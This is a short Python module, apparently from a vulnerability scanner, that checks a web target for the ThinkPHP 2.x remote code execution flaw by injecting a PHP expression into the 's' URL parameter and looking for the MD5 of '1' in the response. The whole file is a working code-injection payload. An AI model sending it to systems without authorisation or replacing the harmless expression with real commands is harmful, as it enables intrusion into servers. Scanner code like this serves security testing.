"""  
@Time: 2023/11/1 11:24 
@Auth: Y5neKO
@File: Thinkphp2_rce.py 
@IDE: PyCharm 
"""

import requests
import re
import urllib
from urllib.parse import urljoin


def run(url, timeout):
    result = {
        'name': 'Thinkphp 2.x rce',
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }
    try:
        payload = urllib.parse.urljoin(url, '/index.php?s=a/b/c/${var_dump(md5(1))}')
        response = requests.post(payload, timeout=3)
        if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
            result['vulnerable'] = True
            result['method'] = 'GET'
            result['url'] = url
            result['payload'] = payload
        return result
    except:
        return result
